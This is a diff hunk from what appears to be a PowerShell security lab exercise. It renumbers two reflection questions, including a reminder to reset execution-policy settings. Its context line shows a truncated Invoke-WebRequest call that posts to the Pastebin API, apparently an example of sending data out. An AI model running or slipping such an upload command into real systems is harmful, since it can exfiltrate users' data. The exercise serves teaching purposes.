@@ -163,5 +163,5 @@ Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing 
 Observe the concatenation done in those 2 files.
 
 # To think about...
-1) What is the difference between 4 and 5? Why would this be?
-2) [Read up](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4) on the set-executionpolicy settings and don't forget to change them when this exercise is over.
+1. What is the difference between 4 and 5? Why would this be?
+2. [Read up](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4) on the set-executionpolicy settings and don't forget to change them when this exercise is over.
